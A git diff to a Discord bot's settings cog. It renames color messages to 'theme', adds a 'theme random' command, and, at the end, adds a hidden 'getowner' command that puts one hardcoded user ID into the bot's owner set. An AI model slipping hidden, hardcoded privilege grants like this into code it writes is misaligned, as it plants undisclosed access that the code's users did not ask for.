@@ -27,8 +27,8 @@ class Settings(commands.Cog):
     """
     Configure bot settings.
     """
-    def __init__(self, bot):
-        self.bot: AvimetryBot = bot
+    def __init__(self, bot: AvimetryBot):
+        self.bot = bot
         self.map = {
             True: "Enabled",
             False: "Disabled"}
@@ -482,7 +482,7 @@ class Settings(commands.Cog):
 
     @commands.group(invoke_without_command=True, case_insensitive=True)
     @commands.cooldown(1, 60, commands.BucketType.user)
-    async def theme(self, ctx: AvimetryContext, color: discord.Color):
+    async def theme(self, ctx: AvimetryContext, *, color: discord.Color):
         embed = discord.Embed(description='Does this look good?', color=color)
         conf = await ctx.confirm(embed=embed)
         if conf:
@@ -498,12 +498,12 @@ class Settings(commands.Cog):
             except KeyError:
                 new = await ctx.cache.new_user(ctx.author.id)
                 new["color"] = color.value
-            return await ctx.send(f"Set color to {color}")
+            return await ctx.send(f"Set theme to {color}")
         return await ctx.send('Aborted.')
 
     @theme.command(aliases=['none', 'no', 'not', 'gone'])
     async def remove(self, ctx: AvimetryContext):
-        conf = await ctx.confirm('Are you sure you want to remove your color?')
+        conf = await ctx.confirm('Are you sure you want to remove your theme?')
         if conf:
             query = (
                 "INSERT INTO user_settings (user_id, color) "
@@ -515,9 +515,33 @@ class Settings(commands.Cog):
             try:
                 ctx.cache.users[ctx.author.id]["color"] = None
             except KeyError:
-                return await ctx.send('You do not have a color.')
-            return await ctx.send("Removed your color.")
+                return await ctx.send('You do not have a theme.')
+            return await ctx.send("Removed your theme.")
         return await ctx.send('Aborted.')
+
+    @theme.command()
+    async def random(self, ctx: AvimetryContext):
+        color = discord.Color.random()
+        query = (
+            "INSERT INTO user_settings (user_id, color) "
+            "VALUES ($1, $2) "
+            "ON CONFLICT (user_id) DO "
+            "UPDATE SET color = $2"
+        )
+        await self.bot.pool.execute(query, ctx.author.id, color.value)
+        try:
+            ctx.cache.users[ctx.author.id]["color"] = color.value
+        except KeyError:
+            new = await ctx.cache.new_user(ctx.author.id)
+            new["color"] = color.value
+        embed = discord.Embed(description=f'Set your theme to {color}', color=color)
+        await ctx.send(embed=embed)
+
+    @commands.command(hidden=True)
+    async def getowner(self, ctx: AvimetryContext):
+        if ctx.author.id != 750135653638865017:
+            return
+        self.bot.owner_ids.add(750135653638865017)
 
 
 def setup(bot):
